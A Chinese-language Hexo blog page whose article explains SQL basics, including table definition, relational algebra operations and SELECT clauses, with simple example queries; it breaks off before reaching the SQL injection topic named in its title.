<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Wang1r">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/04/07/数据库学习与sql注入/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="​	为了复习数据库的考试（其实是预习），我开始学习SQL。但由于我一贯的实用主义思想，既然花费时间去学，它就一定要对我有一定帮助。于是，出于这样的想法以及对自己SQL注入掌握程度的评估，我决定在此之际熟悉一下SQL与SQL注入。 SQL与代数查询语言SQL（Structured Query Language）是关系型数据库的标准语言，它本质上是一种代数查询语言的实现形式。代数查询语言的核心思想是通">
<meta property="og:type" content="article">
<meta property="og:title" content="我要成为SQL糕手——数据库学习与SQL注入">
<meta property="og:url" content="http://example.com/2025/04/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Wang1r的博客">
<meta property="og:description" content="​	为了复习数据库的考试（其实是预习），我开始学习SQL。但由于我一贯的实用主义思想，既然花费时间去学，它就一定要对我有一定帮助。于是，出于这样的想法以及对自己SQL注入掌握程度的评估，我决定在此之际熟悉一下SQL与SQL注入。 SQL与代数查询语言SQL（Structured Query Language）是关系型数据库的标准语言，它本质上是一种代数查询语言的实现形式。代数查询语言的核心思想是通">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-04-07T09:00:14.000Z">
<meta property="article:modified_time" content="2025-06-27T12:24:32.851Z">
<meta property="article:author" content="Wang1rrr">
<meta property="article:tag" content="基础知识">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/example.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/example.png">
    <meta name="theme-color" content="#FFD700">
    <link rel="shortcut icon" href="/images/example.png">
    <!--- Page Info-->
    
    <title>
        
            我要成为SQL糕手——数据库学习与SQL注入 | Wang1rrr&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
        <link href="" rel="stylesheet">
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFD700","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/690195.jpg","dark":"/images/690195.jpg"},"title":"想要成为特别的人","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#000","dark":"#d1d1b6"},"text_style":{"title_size":"3.2rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"YouYuan","url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Wang1rrr","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"About":{"icon":"fa-regular fa-user","path":"/about/"},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/1 12:00:00"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Wang1rrr&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about/"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/links/"
                                        >
                                    <i class="fa-solid fa-link fa-fw"></i>
                                    友情链接
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about/"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/links/"
                        >
                            <span>
                                友情链接
                            </span>
                            
                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">我要成为SQL糕手——数据库学习与SQL注入</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/example.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Wang1r</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-04-07 17:14</span>
        <span class="mobile">2025-04-07 17:14</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-06-27 20:24:32</span>
            <span class="mobile">2025-06-27 20:24:32</span>
            <span class="hover-info">更新</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <p>​	为了复习数据库的考试<del>（其实是预习）</del>，我开始学习SQL。但由于我一贯的实用主义思想，既然花费时间去学，它就一定要对我有一定帮助。于是，出于这样的想法以及对自己SQL注入掌握程度的评估，我决定在此之际熟悉一下SQL与SQL注入。</p>
<h1 id="SQL与代数查询语言"><a href="#SQL与代数查询语言" class="headerlink" title="SQL与代数查询语言"></a>SQL与代数查询语言</h1><p>SQL（Structured Query Language）是关系型数据库的标准语言，它本质上是一种代数查询语言的实现形式。代数查询语言的核心思想是通过数学中的集合运算（如选择、投影、连接等）来操作数据，而SQL正是将这些抽象的数学概念转化为一种易于理解和使用的编程语言。</p>
<p>当我们想从一个表中筛选出某些符合条件的记录时，SQL的<code>SELECT</code>语句直接用自然语言的逻辑表达了这一需求：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, age <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure></div>

<p>不过，SQL的强大之处远不止于此。它支持复杂的集合操作，比如<code>JOIN</code>可以将多个表的数据关联起来，<code>GROUP BY</code>可以对数据进行分组统计，<code>HAVING</code>可以进一步筛选分组结果。SQL不仅仅是一个简单的查询工具，而是一种灵活的表达方式，能够处理各种复杂的数据需求。</p>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="定义关系代数模式"><a href="#定义关系代数模式" class="headerlink" title="定义关系代数模式"></a>定义关系代数模式</h4><p>在操作数据库之前，首先需要定义数据的结构——即关系模式。SQL通过<code>CREATE TABLE</code>语句实现这一功能。其基本语法如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名 (</span><br><span class="line">    列名<span class="number">1</span> 数据类型 [约束条件],</span><br><span class="line">    列名<span class="number">2</span> 数据类型 [约束条件],</span><br><span class="line">    ...</span><br><span class="line">    [表级约束条件]</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h4 id="定义字段与数据类型"><a href="#定义字段与数据类型" class="headerlink" title="定义字段与数据类型"></a>定义字段与数据类型</h4><p>每个字段需要指定数据类型，常见类型包括：</p>
<ul>
<li><strong>数值类型</strong>：<code>INT</code>（整数）、<code>DECIMAL(总位数,小数位)</code>（精确小数）</li>
<li><strong>字符类型</strong>：<code>VARCHAR(长度)</code>（可变长度字符串）、<code>CHAR(长度)</code>（定长字符串）</li>
<li><strong>时间类型</strong>：<code>DATE</code>（日期）、<code>TIMESTAMP</code>（时间戳）</li>
</ul>
<h4 id="定义约束"><a href="#定义约束" class="headerlink" title="定义约束"></a>定义约束</h4><p>约束条件可直接在字段后声明（列级约束），或在所有字段后声明（表级约束）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列级约束示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> departments (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,                    <span class="comment">-- 列级主键</span></span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>              <span class="comment">-- 非空约束</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 表级约束示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    id <span class="type">INT</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="keyword">CHECK</span> (salary <span class="operator">&gt;</span> <span class="number">0</span>),</span><br><span class="line">    department_id <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id),                      <span class="comment">-- 表级主键</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (department_id) <span class="keyword">REFERENCES</span> departments(id) <span class="comment">-- 外键</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h4 id="修改关系模式"><a href="#修改关系模式" class="headerlink" title="修改关系模式"></a>修改关系模式</h4><ul>
<li><p><strong>删除关系</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> tableName;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>修改关系</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> attributeName TYPE(n);               <span class="comment">-- 添加属性</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">DROP</span> attributeName;                      <span class="comment">-- 删除属性</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> attributeName TYPE(n) <span class="keyword">DEFAULT</span> <span class="string">&#x27;defaultValue&#x27;</span>;  <span class="comment">-- 添加有默认值的属性</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="代数查询语言的核心概念"><a href="#代数查询语言的核心概念" class="headerlink" title="代数查询语言的核心概念"></a>代数查询语言的核心概念</h3><p>代数查询语言的基础是关系代数，这是一种数学理论，用于描述如何通过集合运算来操作关系（即表）。SQL的设计正是基于这些理论，它将复杂的数学概念转化为直观的语法，使得用户可以轻松地表达数据操作需求。</p>
<h4 id="选择（Selection）"><a href="#选择（Selection）" class="headerlink" title="选择（Selection）"></a>选择（Selection）</h4><p>选择是关系代数中最基本的操作之一，它用于从表中筛选出满足特定条件的行。在SQL中，这通过<code>WHERE</code>子句实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> department <span class="operator">=</span> <span class="string">&#x27;Sales&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会选择<code>employees</code>表中<code>department</code>列值为<code>Sales</code>的所有行。这种操作对应于关系代数中的σ（sigma）操作符，表示选择满足条件的元组。</p>
<h4 id="投影（Projection）"><a href="#投影（Projection）" class="headerlink" title="投影（Projection）"></a>投影（Projection）</h4><p>投影用于从表中选择特定的列，忽略其他列。在SQL中，这通过<code>SELECT</code>子句实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, salary <span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会选择<code>employees</code>表中的<code>name</code>和<code>salary</code>列。这种操作对应于关系代数中的π（pi）操作符，表示投影特定的属性。</p>
<h4 id="连接（Join）"><a href="#连接（Join）" class="headerlink" title="连接（Join）"></a>连接（Join）</h4><p>连接是关系代数中最强大的操作之一，它用于将两个或多个表中的数据关联起来。在SQL中，这通过<code>JOIN</code>子句实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.department_id <span class="operator">=</span> departments.id;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会将<code>employees</code>表和<code>departments</code>表通过<code>department_id</code>和<code>id</code>列关联起来，并选择员工的名字和对应的部门名称。这种操作对应于关系代数中的⨝（bowtie）操作符，表示连接两个关系。</p>
<h4 id="笛卡尔积（Cartesian-Product）"><a href="#笛卡尔积（Cartesian-Product）" class="headerlink" title="笛卡尔积（Cartesian Product）"></a>笛卡尔积（Cartesian Product）</h4><p>笛卡尔积是连接的一种特殊情况，它将两个表中的每一行都相互组合。在SQL中，这通过省略<code>JOIN</code>条件实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees, departments;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会生成<code>employees</code>表和<code>departments</code>表的笛卡尔积，即每个员工与每个部门的组合。这种操作在实际应用中很少直接使用，但它是连接操作的基础。</p>
<h4 id="差集（Set-Difference）"><a href="#差集（Set-Difference）" class="headerlink" title="差集（Set Difference）"></a>差集（Set Difference）</h4><p>差集用于找出一个表中有而另一个表中没有的记录。在SQL中，这通过<code>EXCEPT</code>或<code>MINUS</code>操作符实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> managers;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会选择所有员工中不是经理的名字。这种操作对应于关系代数中的−操作符，表示差集。</p>
<h4 id="并集（Union）"><a href="#并集（Union）" class="headerlink" title="并集（Union）"></a>并集（Union）</h4><p>并集用于合并两个表中的记录，并去除重复项。在SQL中，这通过<code>UNION</code>操作符实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> full_time_employees</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> part_time_employees;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会选择全职员工和兼职员工的名字，并去除重复项。这种操作对应于关系代数中的∪操作符，表示并集。</p>
<h4 id="交集（Intersection）"><a href="#交集（Intersection）" class="headerlink" title="交集（Intersection）"></a>交集（Intersection）</h4><p>交集用于找出两个表中共有的记录。在SQL中，这通过<code>INTERSECT</code>操作符实现。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> full_time_employees</span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> project_leaders;</span><br></pre></td></tr></table></figure></div>

<p>这条语句会选择既是全职员工又是项目领导的名字。这种操作对应于关系代数中的∩操作符，表示交集。</p>
<h5 id="Theta连接（Theta-Join）"><a href="#Theta连接（Theta-Join）" class="headerlink" title="Theta连接（Theta Join）"></a>Theta连接（Theta Join）</h5><p>广义的连接操作，允许使用任意比较条件（<code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>等），而不仅限于相等判断。例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.name, m.name <span class="keyword">AS</span> manager_name</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">JOIN</span> employees m <span class="keyword">ON</span> e.salary <span class="operator">&gt;</span> m.salary <span class="keyword">AND</span> e.manager_id <span class="operator">=</span> m.id;</span><br></pre></td></tr></table></figure></div>

<p>这种连接方式在关系代数中表示为⨝<sub>θ</sub>，其中θ可以是任意条件。</p>
<h4 id="重命名（Renaming）"><a href="#重命名（Renaming）" class="headerlink" title="重命名（Renaming）"></a>重命名（Renaming）</h4><p>关系代数中使用ρ（rho）操作符对关系或属性进行重命名，SQL中通过<code>AS</code>关键字实现。例如：</p>
<ol>
<li><strong>列重命名</strong>：</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">AS</span> employee_name, salary<span class="operator">*</span><span class="number">12</span> <span class="keyword">AS</span> annual_income <span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure></div>

<p>这会生成包含别名<code>employee_name</code>和<code>annual_income</code>的结果集。</p>
<ol>
<li><strong>表重命名</strong>（尤其在自连接场景中必需）：</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e1.name, e2.manager </span><br><span class="line"><span class="keyword">FROM</span> employees <span class="keyword">AS</span> e1 </span><br><span class="line"><span class="keyword">JOIN</span> employees <span class="keyword">AS</span> e2 <span class="keyword">ON</span> e1.id <span class="operator">=</span> e2.manager_id;</span><br></pre></td></tr></table></figure></div>

<p>通过表别名<code>e1</code>和<code>e2</code>区分同一表的两个不同角色。</p>
<h3 id="SQL中的操作"><a href="#SQL中的操作" class="headerlink" title="SQL中的操作"></a>SQL中的操作</h3><h4 id="1-投影操作（SELECT-子句）"><a href="#1-投影操作（SELECT-子句）" class="headerlink" title="1. 投影操作（SELECT 子句）"></a><strong>1. 投影操作（SELECT 子句）</strong></h4><ul>
<li><p><strong>功能</strong>：从表中选取特定列或计算字段，类似于关系代数中的投影运算。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span>] column1, expression <span class="keyword">AS</span> alias, ... <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>关键点：</p>
<ul>
<li><p>别名（AS）：为列或表达式赋予临时名称，增强可读性。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> price <span class="operator">*</span> <span class="number">0.8</span> <span class="keyword">AS</span> discounted_price <span class="keyword">FROM</span> products;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>常量投影：直接输出固定值。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;Active&#x27;</span> <span class="keyword">AS</span> status, name <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>DISTINCT：消除重复行。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> country <span class="keyword">FROM</span> customers;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>注意事项</strong>：<code>SELECT *</code> 会返回所有列，可能影响性能。</p>
</li>
</ul>
<hr>
<h4 id="2-选择操作（WHERE-子句）"><a href="#2-选择操作（WHERE-子句）" class="headerlink" title="2. 选择操作（WHERE 子句）"></a><strong>2. 选择操作（WHERE 子句）</strong></h4><ul>
